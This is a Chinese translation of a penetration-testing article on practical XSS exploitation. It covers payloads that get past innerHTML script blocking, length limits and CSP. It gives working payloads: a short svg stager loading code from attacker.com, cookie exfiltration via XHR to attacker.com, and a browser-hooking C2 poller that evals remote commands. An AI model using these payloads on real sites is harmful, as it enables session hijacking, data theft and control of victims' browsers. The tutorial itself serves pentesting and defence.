# XSS利用中的一些小坑

阅读量 **283806**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-08-12 15:30:03

 **x**

##### 译文声明

本文是翻译文章，文章原作者 mwrinfosecurity，文章来源：labs.mwrinfosecurity.com

原文地址：<https://labs.mwrinfosecurity.com/blog/getting-real-with-xss/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0135a158cfc7c88cfb.jpg)

## 0x00 前言

随着时间的推移，简单使用`<script>alert(1)</script>`和`python –m
SimpleHTTPServer`的黄金年代已经不复存在。现在想通过这些方法在locahost之外实现XSS（Cross-Site
Scripting）以及窃取数据已经有点不切实际。现代浏览器部署了许多安全控制策略，应用开发者在安全意识方面也不断提高，这都是阻止我们实现传统XSS攻击的一些阻碍。

现在许多人只是简单地展示XSS的PoC（Prof of
Concept），完全无视现代的安全控制机制，这一点让我忧心忡忡。因此我决定把我们在攻击场景中可能遇到的一些常见问题罗列出来，顺便介绍下如何绕过这些问题，实现真正的XSS，发挥XSS的价值。

在进入正文之前，我们要知道现在许多浏览器内置了一些保护措施，可以阻止攻击者利用浏览器特定的漏洞绕过安全机制、发起XSS攻击。然而为了聚焦主题，这里我并不会取讨论如何绕过不同浏览器XSS控制策略的方法。我想关注更为“通用”的内容，聚焦如何在已知内容上进行创新，而不是挖掘全新的方法。

因此我想简单介绍下我在针对现代应用程序利用XSS PoC过程中碰到的一些非常实际的问题，包括：

  * 针对动态创建Web页面时的常见“问题”
  * 隐藏在`<script>alert(1)</script>`表面下的问题
  * 位置问题，知道什么时候我们需要等待
  * 被称为XSS杀手的CSP（Content Security Policy）
  * HTTP/S混合内容，如何“干净地”窃取数据
  * 使用CORS（Cross-Origin Resource Sharing）实现双向C2的一些基本知识点

## 0x01 Element.innerHTML

先从简单的开始讲起。

大家还记得最近一次看到没有采用动态方式构建/改变DOM（Document Object
Model）的应用是什么时候？如果采用动态构建方式，使用元素的`innerHTML`属性将通过某些API获取的内容插入页面，就可能存在一些风险。比如如下API调用：

    
    
    $ curl -X POST -H "Content-Type: application/json" --cookie "PHPSESSID=hibcw4d4u4r8q447rz8221n" 
    -d '{"id":7357, "name":"<script>alert(1)</script>", "age":25}' 
    http://demoapp.loc/updateDetails
    
    {"success":"User details updated!"}
    
    $ curl --cookie "PHPSESSID=hibcw4d4u4r8q447rz8221n" 
    http://demoapp.loc/getName
    
    {"name":"<script>alert(1)</script>"}
    

然后看一下用来动态更改网页内容的“非常安全的”JavaScript代码：

    
    
    function getName() {
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
          var data = JSON.parse(this.responseText);
          username.innerHTML = data['name'];
        }
      }
      xhr.open("GET", "/getName", true);
      xhr.send();
    }
    

这看起来像是非常简单的XSS利用场景。然而，当我们尝试注入基于`<script>`的典型payload时，却看不到什么效果（即使目标应用没有采用任何输入验证机制，也没有编码或转义标签）。如下图所示，正常情况下我们应该能看到一个完美的弹窗：

![](https://p1.ssl.qhimg.com/t015b19b0a7802eda9b.png)

那么究竟这里有什么黑科技？其实这是因为在HTML5规范中，规定了如果采用元素的`innerHTML`属性将`<script>`标签插入页面中，那么就不应该执行该标签。

这可能是比较令人沮丧的一个“陷阱”，但我们可以使用`<script>`标签之外的其他方式绕过。比如，我们可以使用`<svg>`或者`<img>`标签，利用如下API调用来发起攻击：

    
    
    $ curl -X POST -H "Content-Type: application/json" --cookie "PHPSESSID=hibcw4d4u4r8q447rz8221n" -d '{"id":7357, "name":"Bob<svg/onload=alert("Woop!") display=none>", "age":25}' http://demoapp.loc/updateDetails
    
    {"success":"User details updated!"}
    

现在当页面再次获取到用户名，就会达到XSS攻击效果：

![](https://p5.ssl.qhimg.com/t01473500a3f17a378a.png)

## 0x02 Alert(1)

当我们将`<script>alert(1)</script>`注入页面，看到弹窗，就可以在报告中声称我们达到了XSS效果，可以造成严重危害……这就是我所谓的“XSS假象”，虽然已经离事实真相不远。XSS可以造成很严重的危险，但如果我们没法利用XSS达到实打实的效果呢？

当下一次我们发现了一个XSS，尝试向客户介绍漏洞危害。这时候简单弹个内容为`1`的窗显然不够令人信服，无法向客户介绍这个漏洞的严重性，需要修复。

这里我们可以稍微回到前一个例子。我们已经知道可以使用`alert()`，来继续观察能否利用这种攻击方式完成其他任务（比如删除用户账户）。我们可以注入代码，异步调用超级安全的“删除用户”API。更新payload后来试一下能否完成该任务：

    
    
    POST /updateDetails HTTP/1.1
    Host: demoapp.loc
    {"id":7357, "name":"<svg/onload="var xhr=new XMLHttpRequest(); xhr.open('GET', '/authService/user/delete?name=bob', true);xhr.send();">", "age":25}
    
    HTTP 200 OK
    {"error":"Name too long"}
    

好吧，似乎这里有个输入长度限制，除了`alert(1)`之外，我们无法执行太多操作，因此我们很难注入有意义的其他攻击payload（这里我们将长度限制为100个字符，在“实际场景”中，可能对应数据库中的`VARCHAR(100)`字段）。

为了绕过这个限制，通常我们可以使用一个“中转器”（stager），也就是用来加载主payload的一小段代码。比如，用于XSS的一个典型stager如下所示：

    
    
    <script src="http://attacker.com/p.js"></script>
    

上面代码只有48字节，因此没有问题。然而与之前类似，我们无法使用`script`标签，因为这些数据通过元素的`innerHTML`属性加载。

我们是否可以使用图像标签，强制弹出错误，然后将stager附加到元素的`onerror`事件处理函数中呢？来试一下：

    
    
    <img/onerror="var s=document.createElement('script'); s.src='https://attacker.com/p.js'; document.getElementsByTagName('head')[0].appendChild(s);" src=a />
    

好吧现在payload变成了155字符，因此肯定无法生效，会弹出错误。

大家可以看到，这里问题在于我们根据最初的`alert(1)`判断目标存在一个XSS点。然而当我们尝试向他人演示漏洞影响范围，或者想执行其他操作时却无能为力。幸运的是，在这种场景下，我们可以通过如下JavaScript语法开发精简版的XSS
stager，只有98个字符（其实我们可以注册短一点的域名，使用index页面进一步缩小字符数）：

    
    
    <svg/onload=body.appendChild(document.createElement`script`).src='https://attacker.com/p' hidden/>
    

![](https://p5.ssl.qhimg.com/t01c3ab04007e7929ee.png)

## 0x03 执行时机

现在可以谈`innerHTML`之外的东西。大家有没有注意到，有时候我们注入了一个XSS
payload（比如一个`alert`），然后发现弹窗后面变成空白页面，或缺少了某些元素？如果我们只关注弹窗本身，很可能会错失发起有效且整洁XSS攻击的重要机会。这里我们以一个简单的例子来说明。如下表单会通过GET参数提取用户名，预先在网页中填充该用户名：

![](https://p4.ssl.qhimg.com/t01db3f2c61f5de1601.png)

现在该参数存在XSS点，然而当我们执行典型的`alert(1)` payload时，可以注意到后台页面有些不对劲，部分页面元素已丢失：

![](https://p0.ssl.qhimg.com/t01da5e339910773a84.png)

我们可以无视这一点，认为找到了XSS点，因此可以窃取各种信息、直击目标等。

但事实并非如此，我们可以进一步分析。实际上该表单包含一个CSRF令牌，我们可以查看源代码：

    
    
    ...
    <input type="text" id="message" placeholder="Message">
    <input type="text" id="csrf" value="6588FF104A8522D7AB15563058AA022" hidden>
    <input id="btnSubmit" type="submit" value="Send">
    ...
    

那么我们可以创建个payload来访问该信息，窃取反csrf令牌：

    
    
    ?name="><script>alert(csrf.value)</script><link/rel="
    

额，payload貌似无法成功执行，我们可以在浏览器控制台看到错误信息。但很奇怪，`csrf`的值肯定已经定义，因为我们能在控制台中dump出这个值：

![](https://p0.ssl.qhimg.com/t0169b19b9b3df364b1.png)

那么为什么我们无法访问这个值？这里问题在于页面中我们选择的注入点。

如果我们在需要访问的元素前面注入代码，那么在代码执行前，我们首先需要等待DOM完成构建。这是因为目标页面采用“自顶向下”的方式进行构建，而在本例中，我们的payload注入在`To`字段中，该字段位于`csrf`令牌字段之前。由于DOM还没有完成构建，因此在执行时这个`csrf`元素还没有存在，这也是为什么当我们执行弹窗时页面会缺失某些元素的原因所在。

为了克服这一点，我们可以在文档中附加一个事件监听器，一旦DOM完成加载过程就触发我们的代码。与往常一样，我们有很多种办法能完成该任务，但负责处理该场景的“默认”事件为`DOMContentLoaded`，我们可以通过如下方式来使用：

    
    
    ?name="><script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
    

![](https://p2.ssl.qhimg.com/t0130ade3b2510d0079.png)

## 0x04 CSP策略#1

继续研究，来看一下针对未设置CSP（Content Security Policy）应用的反射型XSS（reflected
XSS）攻击。目标HTML页面如下所示：

    
    
    <html>
        <body>
            Hello <?php echo (isset($_GET['name']) ? $_GET["name"] : "No one"); ?>
        </body>
    </html>
    

我们可以使用`<script>alert(1)</script>`攻击该页面，如下所示：

    
    
    ?name=Bob<script>alert(1)</script>
    

![](https://p2.ssl.qhimg.com/t0136fb241042b12b47.png)

那么，如果目标返回如下CSP响应头，再次攻击时会出现什么情况？

    
    
    Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' *
    

![](https://p4.ssl.qhimg.com/t0166c9378a8d84db54.png)

我们的payload无法生效。这是因为默认情况下CSP会阻止内联JavaScript代码执行。为了让CSP支持内联代码，需要为`script-src`指令设置`unsafe-inline`。

那么如何绕过这个限制？这里我们可以看到加载脚本的策略为`script-src ‘self’ *`，需要注意一点，其中有个通配符（`*`）。`script-src`指令可以用来设置白名单，允许将外部JavaScript源加载到特定源。然而，这里的通配符表示任何外部JS源都可以从任何源来加载，既可以是`google.com`，也可以是`attacker.com`。

为了绕过该策略，我们可以将XSS
payload托管到我们恶意服务器（比如`attacker.com`）上的某个文件（比如`p`），然后在注入的`script`标签的`src`属性中加载这个payload，如下所示：

    
    
    # Hosted File: p ON attacker.com
    alert("Loaded from attacker.com");
    
    # XSS payload FOR demoapp.loc 
    ?name=Bob<script src='https://attacker.com/p'></script>
    

![](https://p4.ssl.qhimg.com/t01065ee8de0937eb1a.png)

## 0x05 CSP策略#2

好吧，上面这个例子实在太“弱智”了。我们可以尝试使用相同的payload，但这次面对的是如下CSP策略：

    
    
    Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' https://apis.provider-a.com
    

![](https://p1.ssl.qhimg.com/t01ef1a82a565db7e7f.png)

这个CSP策略想要绕过要更难一些，并且我们在实际环境中经常碰到这种情况（可能稍微有点变化）。我们再也无法执行内联JS，因此无法直接注入反射型XSS
payload。此外，现在我们也无法从应用自己的域之外加载JS源（除了`apis.provider-a.com`）。那么我们该怎么办？

我们需要找到能在目标应用服务器上将任意JS存放到某个文件的一种方法（永久存储或者临时存储都可以）。我们可以通过任意文件上传、存储型XSS、第二个反射型XSS点或者纯文本反射攻击点来完成该任务，但避免不了需要找到第二个漏洞。在这个例子中，我们准备将最初的反射型XSS攻击点与第二个注入漏洞点结合起来，但后者并不是一个XSS点。

来快速了解一下第二个问题：

    
    
    https://demoapp.loc/js/script?v=1.2.4
    

![](https://p0.ssl.qhimg.com/t01b31b4606cfbf70e5.png)

这里我们可以看到目标上有个脚本，会根据GET参数来加载特定版本的样式表。虽然这本身并不是一个反射型XSS点（因为我们可以在该页面中执行代码），但因为没有对输入进行验证，的确允许攻击者在应用的域中反射（临时存储的）任意JS。

    
    
    https://demoapp.loc/js/script?v=1.7.3.css”/>’);alert(1);//
    

![](https://p2.ssl.qhimg.com/t017089bfab6cfe9592.png)

为了绕过这个CSP策略，得到我们熟悉的`alert`框，我们可以将第二个注入URL点当成第一个XSS注入脚本的源（记得使用两层URL编码）：

    
    
    https://demoapp.loc/xss?name=Bob<script src='https://demoapp.loc/js/script?v=1.7.3.css%2522/>%2527)%3Balert(%2522Yeah!%2520Chaining!%2522)%3B//'></script>
    

![](https://p3.ssl.qhimg.com/t01c2762d9034efe012.png)

## 0x06 HTTP及HTTPS混合

我们已经绕过了CSP，成功实现反射型XSS
PoC，现在我们可以窃取一些信息。我们使用python的`SimpleHTTPServer`模块搭建一个简单的HTTP服务器，创建一个新的JS
payload，通过异步HTTP请求（比如使用XMLHttpRequest，及XHR）来提取用户的cookie信息。事不宜迟，来试一下：

    
    
    var xhr=new XMLHttpRequest();
    xhr.open("GET", "http://attacker.com:8000/?"+document.cookie, true);
    xhr.send();
    

![](https://p4.ssl.qhimg.com/t017a897e5be8e5391d.png)

如上图所示，这种方法无法奏效，浏览器会完全阻止我们的请求。这是因为目标部署了“安全的”HTTPS网站，而该请求发往的是不安全的HTTP端点。这样一来就会在浏览器中触发内容混合型的strict-error。

这里我们需要注意一点，混合内容策略中存在一个例外。浏览器厂商认为通过未加密HTTP信道从当前主机加载内容是例外情况，这种场景与通过因特网加载HTTPS内容一样安全。因此，浏览器会将`127.0.0.1`（显式）加入白名单中，这样在本地测试时就无需部署SSL证书，也不会触发混合内容警告（注意，这种情况只适用于使用`127.0.0.1`这个IP地址，并不是本地IP或者本地主机名）。

我们可以使用浏览器控制台来测试，如下所示（现在先忽视CORS错误）：

![](https://p1.ssl.qhimg.com/t012fba6312b5b15272.png)

    
    
    $ python -m SimpleHTTPServer...127.0.0.1 - - [17/Feb/2019 10:34:07] "GET /?token=Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtpOjMzO3M6ODoidXNlcm5hbWUiO3M6NToiYWxpY2UiO3M6NToiZW1haWwiO3M6MTc6ImFsaWNlQGRlbW9hcHAubG9jIjt9--500573368be90e2717fa2aff1bfc5554;%20verified=yes HTTP/1.1" 200 –
    

然而，我们无法在实际攻击中使用`127.0.0.1`这个IP地址。根据我们想要达成的“目标”，在攻击过程中我们通常可以有两种选项：

1、如果我们需要发送POST请求，或者访问服务端的响应（例如XHR polling），那么我们需要使用TLS证书来配置自己的web服务器。

优点：解决所有问题。

缺点：配置起来优点麻烦。

2、如果我们不需要访问响应数据，一个GET请求就足够，那么我们只需要使用一个HTML image对象即可。

优点：不论是通过HTTP或者HTTPS，这种方法通常能实现加载。

缺点：并不是百分百可靠，控制台中会出现警告。

![](https://p0.ssl.qhimg.com/t016af9281468ef95d2.png)

最终，设置互联网可访问的web服务器，搭配有效的SSL/TLS证书是目前最为推荐的解决方案。这种方案不单单适用于XSS，同时也适用于其他攻击场景，比如XXE、SSRF、CSRF、Blind
SQLI等。

## 0x07 利用CORS

来回顾一下，现在我们的状态为：

  * 实现反射型XSS
  * 通过结合两个相对无害的独立漏洞来绕过CSP
  * 放弃`SimpleHTTPServer`，使用Web Server+TLS解决混合内容错误

但我们仍然无法从web服务器获取数据。不过我们为什么要解决这个问题？毕竟我们的目的只是窃取某些cookie值。如果cookie受`HttpOnly`保护，而我们想利用用户会话，通过受害者浏览器来代理具体请求，那么该怎么做？我们可以更进一步，而不单单是提取cookie值。这里我们需要注入某种C2
payload，“hook”浏览器。比如使用如下XHR polling C2 PoC：

    
    
    function poll() {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange=()=>{
            if (xhr.readyState == 4 && xhr.status == 200) {
                var cmd = xhr.responseText;
                if (cmd.length > 0) { eval(cmd) };
            }   }
        xhr.open("GET", "https://attacker.com/?poll", true);
        xhr.send(); setTimeout(poll, 3000);
    }; poll();
    

这个payload会每隔`3`秒轮询（poll）我们的服务器，请求服务端“命令”，执行收到的HTTP响应body中的JavaScript。这里的问题在于，CORS策略不允许客户端读取响应，反过来也意味着我们无法将命令发送到被“hook”的页面：

![](https://p5.ssl.qhimg.com/t0103f8802d4ddc4639.png)

在窃取数据时，CORS通常不是主要问题，因为CORS并没有阻止我们发送请求，只是会阻止客户端读取响应数据。然而当我们尝试将新数据载入某个应用时，这个就变成一个大问题了。

幸运的是，解决这个问题的主动权掌握在攻击者这边。我们只需要在C2服务器中添加适当的CORS响应头即可：

    
    
    Access-Control-Allow-Origin: https://demoapp.loc
    

现在如果我们在C2服务器上存放命令，那么XSS payload就可以获取该“命令”，尝试使用`eval()`执行该命令。来试一下：

![](https://p2.ssl.qhimg.com/t01d4941908bba3bc7b.png)

好吧，真是好事多磨，没那么简单。

## 0x08 绕不开的CSP

当我们认为已经绕过CSP时，它又再次出现横插一脚。

能执行任意JS显然是非常强大的一个功能，这也是为什么我们需要显式在CSP策略中允许`unsafe-eval`的原因所在。在这个案例以及许多实际环境中往往不具备该条件。

那么如何执行JS呢？现在我们无法使用“内联”的JS、加载外部资源、使用`eval()`以及其他类似函数（如`timeout()`、`setInterval()`、`new
Function()`等）。

但我们已经可以执行任意JS，将最初的payload载入受害者浏览器中。因此我们可以将这个漏洞点包装成自定义的一个`exec()`函数，将其作为`eval()`的替代品。该函数的典型实现如下所示：

    
    
    function exec(cmd) {
        var s = document.createElement`script`;
        s.src = "js/script?v="+encodeURIComponent("1.2.3.css"/>');"+cmd+"//");
        with(document.body){appendChild(s);removeChild(s)};
    }
    

成功注入并完成设置后，我们可以通过如下方式，向hook的页面发送命令：

    
    
    $ ./c2.py -t demoapp.loc -s attacker.com –c ‘alert(“Hello from C2!”)’
    

![](https://p2.ssl.qhimg.com/t01aa3141b549233dde.png)

将这个流程梳理一下，如下图所示，方便大家理解：

![](https://p2.ssl.qhimg.com/t017152d59134aaf443.png)

## 0x09 总结

本文简单介绍了在“实际环境”中利用XSS点时需要注意的几个常见坑。从理论上讲，介绍XSS
PoC的各种文章、书籍、博客等都非常优秀，但我发现实际利用中细节非常关键，并且很多时候我们都会忽略掉这些小细节。掌握这些细节后，我们可以放心向客户们演示XSS的危害以及真正价值，而不是简单的`alert(1)`弹窗。

本文翻译自labs.mwrinfosecurity.com
[原文链接](https://labs.mwrinfosecurity.com/blog/getting-real-with-xss/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/183892](/post/id/183892)

安全客 - 有思想的安全新媒体

本文转载自:
[labs.mwrinfosecurity.com](https://labs.mwrinfosecurity.com/blog/getting-real-with-xss/)

如若转载,请注明出处： <https://labs.mwrinfosecurity.com/blog/getting-real-with-xss/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [xss](/tag/xss)

 **+1** __22赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

